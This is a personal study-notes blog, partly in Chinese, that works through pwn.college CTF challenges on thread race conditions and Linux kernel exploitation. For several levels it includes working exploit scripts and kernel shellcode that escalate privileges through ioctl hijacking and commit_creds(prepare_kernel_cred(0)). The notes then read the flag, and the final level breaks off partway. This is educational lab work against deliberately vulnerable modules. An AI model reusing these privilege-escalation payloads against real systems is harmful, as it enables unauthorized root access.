<p>10, 11 have semaphores on broadcast, 11 has a printf instead of strlen-read</p>
</blockquote>
<p>dicord上面都用的是sigpipe. 这个会调用pthread_exit()函数. </p>
<p>.0程序停在了message赋值的每一次循环, 这个时候可以发送sigpipe直接结束线程, 这样sem_post不会执行, global_message_mutex也不再可用, 意味着没有线程能够再进入critical section. </p>
<blockquote>
<p>Or not consuming input so the writes to the socket block at the right time</p>
<p>不知道这能不能行. 这只能在send_message停下.</p>
</blockquote>
<p>processes are as follows:</p>
<ul>
<li>one connection sends <code>send_redacted_flag</code> command, then completes the str copy. </li>
<li>another or still the same connection sends <code>send_message</code> command with <code>whatthefuckisthis</code>, causing overlapping the null-byte between prompt and flag. after null-byte, before last byte, sending SIGPIPE to stop thread.</li>
<li>another connection send <code>receive_message</code>.</li>
<li>every program run can only test once.</li>
</ul>
<p>succeeding in .0 practice.</p>
<h1 id="module-D-kernel"><a href="#module-D-kernel" class="headerlink" title="module D-kernel"></a>module D-kernel</h1><h4 id="key-point"><a href="#key-point" class="headerlink" title="key point:"></a>key point:</h4><h5 id="Intro"><a href="#Intro" class="headerlink" title="Intro:"></a>Intro:</h5><ul>
<li><a target="_blank" rel="noopener" href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-1.html">linux syscall <em>DETAILS</em> (<strong>linux inside</strong>)</a> |  <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/">linux_kernel_doc</a> | <a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/syscall">syscall instruction</a> | <a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html">Attributes of Variables(gcc)</a> | <ul>
<li>you cannot find <em>noderef</em> or <em>address_space</em> in the GCC docs because they are not GCC attributes. They have meaning only for <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Sparse">Sparse</a>.<br>about <a target="_blank" rel="noopener" href="https://www.linuxquestions.org/questions/linux-kernel-70/what-does-__attribute__-noderef-address_space-2-mean-4175493101/">the effect</a>.</li>
</ul>
</li>
<li><strong>Modern solution to Rings:</strong> Ring -1, <em>Hypervisor Mode</em>. Able to intercept sensitive Ring 0 actions done by guests and handle them in the host OS.</li>
<li>syscall High-level overview:<ol>
<li>At bootup, in Ring 0, the kernel sets MSR_LSTAR to point to the syscall handler routine.</li>
<li>When a userspace (Ring 3) process wants to interact with the kernel, it car call syscall.<br>a. Privilege level switches to Ring 0.<br>b. Control flow jumps to value of MSR_LSTAR.<br>c.  Return address saved to <strong>rcx</strong>.<br>d. That’s basically it! <a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li>
<li>When the kernel is ready to return to userspace, it calls the appropriate return instruction (i.e., <strong>sysret</strong> for syscall).<br> a. Privilege level switches to Ring 3.<br> b. Control flow jumps to rcx.<br> c. That’s basically it!</li>
<li><code>x86-64: rdi   rsi   rdx   r10   r8    r9    -</code><br>We can see the 6 args are stored in these registers. rcx is used to store syscall return address, so args skip rcx.</li>
</ol>
</li>
<li>exploit dirctions:<ul>
<li>From the network: remotely-trigged exploits (packets of death, etc). Rare!</li>
<li>From userspace: vulnerabilities in syscall and ioctl handlers (i.e., launched from inside a <strong>sandbox</strong>!)</li>
<li>From devices</li>
</ul>
</li>
</ul>
<h5 id="kernel-module"><a href="#kernel-module" class="headerlink" title="kernel module"></a>kernel module</h5><ul>
<li><code>lsmod</code> list kernel module. like device drivers(graphic card), filesystems, networking functionality, other stuff.<br>all with <code>.ko</code> extension.</li>
</ul>
<p>How to interact with kernel module for further exploitation?</p>
<ul>
<li>historically, kernel modules could add syscall entries. nowadays less used.</li>
<li>interrupts. a module could register a interrupt handler to <strong>hook</strong>. <code>int3</code> and <code>int1</code> are one-byte interrupt instructions which may be useful.</li>
<li>files. <ul>
<li><code>/dev</code>: mostly traditional devices (i.e., /dev/dsp for audio)</li>
</ul>
<ol start="2">
<li><code>/proc</code>: started out in System V Unix as information about running processes. Linux expanded it into in <strong>a disastrous mess of kernel interfaces</strong>.</li>
</ol>
<ul>
<li><code>/sys</code>: non-process information interface with the kernel. </li>
<li>A module can register a file in one of the above locations.<br>Userspace code can <em>read|open()</em> that file to interact with the module!<br>or <em>ioctrl()</em> function sends setting and querying non-stream data(i.e., webcam resolution <strong>settings</strong> as opposed to webcam video <strong>stream</strong>).</li>
</ul>
</li>
</ul>
<p>driver interaction:</p>
<ul>
<li>reads data from userspace (using <code>copy_from_user</code>, a kernel API)</li>
<li>“does stuff” (open files, read files, interact with hardware, etc)</li>
<li>writes data to userspace (using copy_to_user)</li>
<li>returns to userspace</li>
</ul>
<p>kernel module: <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">manpage section 9</a> |  <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">kernel doc</a> </p>
<ul>
<li>compilation:<ul>
<li>kernel modules are all listed in the <code>pwnkernel/src/</code> </li>
<li>at the end of the build.sh, there is a <em>building modules</em> procedure. it calls Make makefile in src dirctory then copys <code>.ko</code> file to fs directory being mounted at <code>/home/ctf</code>. </li>
<li>so before compilation, adding an entry to makefile for newly added module.</li>
</ul>
</li>
<li>command: <u>must be used under root. or sh not found</u>.<ul>
<li><code>insmod</code> command: load kernel module. or through <code>init_module</code> system call.</li>
<li><code>lsmod</code> : list all modules.</li>
<li><code>rmmod</code> : remove module.</li>
</ul>
</li>
<li>testing module:<ul>
<li><code>hello_log.ko</code>: just print something to kernel ring buffer.</li>
<li><code>hello_dev_char.ko</code>: register a character device. may use head, dd(with option like: if=/dev/pwn-college-char of=/proc/self/fd/1 bs=128 count=1) , etc, to read from it.</li>
<li><code>hello_ioctl</code>: exposes a /dev device with ioctl interface</li>
<li><code>hello_proc_char</code><strong>:</strong> exposes a /proc device</li>
<li><code>make_root</code>: exposes a /proc device with ioctl interface and an evil backdoor!</li>
</ul>
</li>
</ul>
<h5 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h5><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1tcR4YsVhN2kVUfe8RJw56dtSs-QOwp4-g8qgI0Q3kFM/edit#slide=id.g75a3c0c177_2_16">SLIDE</a>. in make_root.c.</p>
<h5 id="Escape-Seccomp"><a href="#Escape-Seccomp" class="headerlink" title="Escape Seccomp"></a>Escape Seccomp</h5><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1YMlOERClX6Yi8Fb9DYxBBJ5MYB1C-_F75XKkoSmbl8k/edit#slide=id.ga2eb818465_0_0">SLIDE</a> </p>
<p>mainly disable <code>TIF_SECCOMP</code> bit. all in SLIDES.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-comment">// LOTS of stuff, including</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags;	<span class="hljs-comment">/* low level flags */</span><br>    u32 status;		<span class="hljs-comment">/* thread synchronous flags */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>Yan demonstrates how to use make_root.ko to escape seccomp and escalating privilege.</p>
<h5 id="memory-managment"><a href="#memory-managment" class="headerlink" title="memory managment"></a>memory managment</h5><ul>
<li>linux use four level page table:</li>
</ul>
<img src="../../image/pwn-modules/image-20220523182826589.png" srcset="/img/loading.gif" lazyload alt="image-20220523182826589" style="zoom:80%;" /> 

<ul>
<li>only lower 48 bits are used in addressing. higher 12bits used to denote the kernel space. and ARM arch take these bits as tag for security concerns. <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/tagged-pointers">android source</a> | <a target="_blank" rel="noopener" href="https://llvm.org/devmtg/2018-10/slides/Serebryany-Stepanov-Tsyrklevich-Memory-Tagging-Slides-LLVM-2018.pdf">LLVM memory tagging</a> | </li>
<li>Virtual Machine isolation: The extended page table.</li>
<li>MMU + TLB</li>
<li>other architectures are analogous in <strong>paging</strong>. Linux <em>requires</em> a hardware MMU (although certain forks do not).</li>
<li><strong>The Old Way</strong>: Old Linuxes could access physical memory via <strong>/dev/mem</strong> as root.<br><strong>The New Way</strong>: If you want to get at physical memory now, you must do it from the <strong>kernel</strong>. Physical memory is mapped <em>contiguously</em> in kernel’s virtual memory space for convenient access. Two macros, <code>phys_to_virt()</code> and <code>virt_to_phys()</code>.</li>
</ul>
<h5 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h5><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1DNxufs_WlQRkzBMjPD7UE1qRrd87XDGpfQSPkiajEyE/edit#slide=id.gfbef220448_0_48">SLIDES</a> many links.</p>
<ul>
<li><p><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</p>
</li>
<li><p>Function Granular ASLR.</p>
</li>
<li><p>Supervisor Memory Protection:</p>
<ul>
<li><strong>SMEP.</strong><br>Prevents kernel-space code from <strong>E</strong>xecuting userspace memory <em>at all ever</em>.</li>
<li><strong>SMAP.</strong><br>Prevents kernel-space from even <strong>A</strong>ccessing userspace memory <em>unless the AC flag in the RFLAGS register is set</em>. Two ring0 instructions, stac and clac, manage this bit.</li>
<li>Why separate these? in SLIDES.</li>
</ul>
</li>
</ul>
<h5 id="kernel-shellcode"><a href="#kernel-shellcode" class="headerlink" title="kernel shellcode"></a>kernel shellcode</h5><ul>
<li>you cant use syscalls in kernel. just use call instruction with symbol addresses in /proc/kallsyms</li>
<li>KASLR. if it is on, then I need to find a vulnerability to leak an kernel symbol address.</li>
<li>indirect calls.</li>
<li>seccomp escaping: notice gs segment register to figure out where the task struct is.</li>
<li>The kernel is WAY too complex to figure out offsetsmanually.<br>Best option:<ol>
<li>Write a kernel module in C with the actions you want<br>your shellcode to do.</li>
<li>Build it for the kernel you want to attack (e.g., using<br>the vm build command in pwn.college).</li>
<li> Reverse-engineer it to see how these actions work in<br>assembly.</li>
<li>Re-implement that assembly in your shellcode!</li>
</ol>
</li>
<li>be careful with kernel code context! Try to have it act like a normal function and <strong>return</strong> when it’s done.</li>
</ul>
<h5 id="Env-setup"><a href="#Env-setup" class="headerlink" title="Env setup"></a>Env setup</h5><p>build for old kernel 5.4: <a target="_blank" rel="noopener" href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p>
<ul>
<li>first complie stopping at <code>thunk_64.o</code>, due to missing symbol table.<ul>
<li>revise <code>linux-5.4/tools/objtool/elf.c</code> line 380 -&gt; <a target="_blank" rel="noopener" href="https://www.spinics.net/lists/kernel/msg3797871.html">link</a> </li>
</ul>
</li>
<li>then revise build.sh and take a vm snapshot.</li>
<li>then revise <code>arch/x86/boot/compressed/pgtable_64.c</code> to fix multiple definitions of <code>__force_order</code>. <a target="_blank" rel="noopener" href="https://lkml.org/lkml/2019/12/21/121">link</a> </li>
<li>OK. total size is 4.3G. by <code>du -sh pwnkernel</code> </li>
</ul>
<p>VM by qemu: </p>
<ul>
<li><p>require: new version of gdb, kernel with debug symbols, ASLR is off(in ./launch there is <code>-append</code> option for qemu, <strong>check its usage</strong>).</p>
</li>
<li><p>because the kernel is started with qemu, so can debug with gdb through port 1234.</p>
<p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234</code> (I added it into .gdbinit in pwnkernel/)</p>
</li>
<li><p><code>cat /proc/kallsyms</code>  you can see all symbols in kernel. because we disabled the kernel address space randomization, it will always be the same.</p>
</li>
<li><p> only a limited number of commands will work in vm. look <code>ls /bin</code> for details. Because the shell is provided by busybox, so there is a lack of functionality.</p>
</li>
<li><p>use <code>sh -l</code> or <code>su - ctf</code> to load ~/.profile. there is some convenient aliases.</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1Ik7EWjn_9ywzCW3MpJJ0eVdIvhIMP6brObBQQDtYDCo/edit#slide=id.ga548015bd5_0_114">further setup is here</a> </p>
<p>tips: </p>
<ul>
<li>wget command in build.sh has been added with -c option(–continue), which means that it won’t repeat downloadiing when there is an already existing file in the same directory.</li>
<li><code>mkdir -p</code> no error if existing.</li>
</ul>
<h5 id="online-environment"><a href="#online-environment" class="headerlink" title="online environment"></a>online environment</h5><ul>
<li><code>vm debug</code>: I have no idea about what happened…….it suddenly worked and then shutdown…..</li>
<li>太蠢了, 全都停不下来. 等会看一下writing kernel shellcode. 没用啊, 难不成全部都变成本地做? 也不是不行就是了…….</li>
<li> 只是不能debug. 暂未发现解决办法.</li>
</ul>
<h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><p>.0 level calls <code>printk()</code> function to give some info in kernel ring buffer. Obviously, .1 level doesn’t. </p>
<p>tested in ipython:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>os.write(fd, <span class="hljs-string">&#x27;password&#x27;</span>)<br>os.read(fd, <span class="hljs-number">60</span>)<br></code></pre></div></td></tr></table></figure>

<h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><p>unlike previous level, there is no device_read() function, rather printk(flag) exists in device_write with password check.</p>
<p>script is the same way.</p>
<h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3"></a>level3</h4><p>the kernel module defines a win() function which will elevate the calling process privilege.</p>
<p>once pass the check, current process(i.e., ipython), will run as root. then use <code>!cat /flag</code>. everything is done.</p>
<p>even while the password is for previous level, it just still works……..</p>
<h4 id="level4-5"><a href="#level4-5" class="headerlink" title="level4"></a>level4</h4><p>hijack the kernel module by <code>ioctl()</code>. it is in python <code>fcntl</code> module. <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/fcntl.html">doc</a> </p>
<p>in python fcntl.fcntl() almost equals to fcntl.ioctl(), <strong>except for ioctol’s <em>arg</em> argument can accept <em>bytes</em></strong>.</p>
<p>script:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fcntl, os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>fcntl.ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-string">b&#x27;ruysmamctudpofzh&#x27;</span>)<br><span class="hljs-comment">#then !cat /flag</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h4><p>device_ioctl() calls __x86_indirect_thunk_rbx.</p>
<p>retpoline, __x86_indirect_thunk_rbx……what’re these?</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4/source/arch/x86/lib/retpoline.S#L11">here</a> it is(<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48089426/what-is-a-retpoline-and-how-does-it-work">here</a> is repoline and google’s <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/7625886">article</a>). when debugging, I find that it just merely jumps to the address the register(<strong>rbx</strong>) points to. so many nested macros in kernel code…..</p>
<p>ATTENTION: The following piece of code in fact create a function, and in kernel module it calls the it. Thus module will push return address onto stack and when returning from the <em>THUNK</em>  function it’ll come back to complete the rest of cleanups.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">GENERATE_THUNK(_ASM_BX)<br>↘<br>#define __EXPORT_THUNK(sym) _ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)<br>#define EXPORT_THUNK(reg) __EXPORT_THUNK(__x86_indirect_thunk_ ## reg)<br>#define GENERATE_THUNK(reg) THUNK reg ; EXPORT_THUNK(reg)<br>↘<br>.macro THUNK reg<br>	.section .text.__x86.indirect_thunk<br><br>ENTRY(__x86_indirect_thunk_\reg)<br>	CFI_STARTPROC<br>	JMP_NOSPEC %\reg	  #simply a jmp to shellcode. no change to the stack. <br>						#we can directly use ret to come back to module code.<br>	CFI_ENDPROC<br>ENDPROC(__x86_indirect_thunk_\reg)<br>.endm<br></code></pre></div></td></tr></table></figure>

<p>what value dose the rbx hold before execute <code>jmp rbx</code> instruction? it is ioctl()’s <em>arg</em> argument.</p>
<p>by <code>cat /proc/kallsyms | grep win</code> command,  the win()’s address can be easily found. <code> ffffffffc0000c5d t win  [challenge]</code> </p>
<p>but in pwn.college….</p>
<img src="../../image/pwn-modules/image-20220524205647223.png" srcset="/img/loading.gif" lazyload alt="image-20220524205647223" style="zoom:80%;" />

<p>let’s give up this mysterious environment.</p>
<blockquote>
<p>Now I know why it would happen……<br>normal user that doesn’t have enough privilege will find all kernel symbols with address 0.<br>then what should i do in pwn.college? emmmmmm<br>maybe i need to grep in practice mode and come back.</p>
</blockquote>
<p>script:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-number">0xffffffffc0000c5d</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>I win.</p>
<img src="../../image/pwn-modules/image-20220524211101441.png" srcset="/img/loading.gif" lazyload alt="image-20220524211101441" style="zoom:80%;" />

<h4 id="level6-6"><a href="#level6-6" class="headerlink" title="level6"></a>level6</h4><p>begin kernel shellcoding!</p>
<ul>
<li>at the beginning of module, it calls <code>kmalloc()</code> function to allocate a chunk of virtual address contiguous memory. the details of its argument are waiting to be check.</li>
<li>when writing to /proc/pwncollege, the device_write() in kernel will call <code>copy_from_user()</code> to copy shellcode from <code>write()</code>‘s buffer argument to <em>shellcode</em> variable. and jmp to shellcode address.</li>
<li>donot forget to restore kernel’s context after shellcode returns.</li>
</ul>
<p>The ciritical point of shellcoding in kernel is we can only call kernel function. here i use <code>prepare_kernel_cred()</code> and <code>commit_cred()</code> to achive privilege escalation.</p>
<ul>
<li>two functions’ address:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/kallsyms | grep -E <span class="hljs-string">&#x27;prepare_kernel_cred|commit_cred&#x27;</span></span><br>ffffffff810892c0 T commit_creds                                   <br>ffffffff810895e0 T prepare_kernel_cred                            <br></code></pre></div></td></tr></table></figure>

<ul>
<li>then <code>commit_cred(prepare_kernel_cred(0))</code> </li>
</ul>
<p>reassembly code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    _copy_from_user ; PIC mode<br>mov     rbp, rax<br>mov     rax, cs:shellcode<br>call    __x86_indirect_thunk_rax ; PIC mode<br><br>mov     rax, rbx<br>pop     rbx<br>sub     rax, rbp<br>pop     rbp<br>retn<br></code></pre></div></td></tr></table></figure>

<ol>
<li>what would happen if device_write() return non-zero? first try to non-restore:</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	xor edi, edi</span><br><span class="hljs-string">	mov rbx, 0xffffffff810895e0</span><br><span class="hljs-string">	call rbx</span><br><span class="hljs-string">	mov rdi, rax</span><br><span class="hljs-string">	mov rbx, 0xffffffff810892c0</span><br><span class="hljs-string">	call rbx</span><br><span class="hljs-string">	ret	//equals to the ret in device_write()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure>

<p>The ret instruction equals to the ret in device_write(), and violate the conventions of caller-saved resgiter–rbx. it may crash the kernel. but in practice, it doesn’t.</p>
<p>script:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-comment">//gernerated with pwnsh</span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, shellcode, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>win again.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ ./test                                                                                                        <br>[ 2166.732101] [device_open] inode=ffff888006e33448, file=ffff888006bf7900                                        <br>[ 2166.737393] [device_write] file=ffff888006bf7900, buffer=0000000000481004, length=4096, offset=ffffc900001a7f08<br>pwn_college&#123;what the fuck?&#125;                                                                                       <br>[ 2166.748112] [device_release] inode=ffff888006e33448, file=ffff888006bf7900                                     <br></code></pre></div></td></tr></table></figure>

<h4 id="level7-5"><a href="#level7-5" class="headerlink" title="level7"></a>level7</h4><p>execute shellcode through ioctl</p>
<p>after checking the code for a while, I found that it may need to define a struct to wrap up the <em>arg</em> for <code>ioctl()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">device_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">char</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> shellcode_length; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> (*shellcode_execute_addr)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//for canary</span><br>  printk(&amp;unk_A30, file, cmd); <span class="hljs-comment">//nothing</span><br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">1337</span> ) <span class="hljs-comment">//request number must be 1337</span><br>  &#123;<br>    copy_from_user(&amp;shellcode_length, arg, <span class="hljs-number">8LL</span>);<br>    copy_from_user(&amp;shellcode_execute_addr, arg + <span class="hljs-number">4104</span>, <span class="hljs-number">8LL</span>);<br>    <span class="hljs-comment">//the shellcode_length and addr come from the (void*)arg.</span><br>    <span class="hljs-comment">//the maximun len of code is 4104 bytes.</span><br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( shellcode_length &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, arg + <span class="hljs-number">8</span>, shellcode_length);	<span class="hljs-comment">//copy shellcode.On success will return 0</span><br>      _x86_indirect_thunk_rax(shellcode_execute_addr);<span class="hljs-comment">// jumpto shellcode.</span><br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>the struct may be like:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4104</span>];<br>    <span class="hljs-keyword">void</span>* addr = ?;<br>&#125;test;<br></code></pre></div></td></tr></table></figure>

<p>code near jmp:</p>
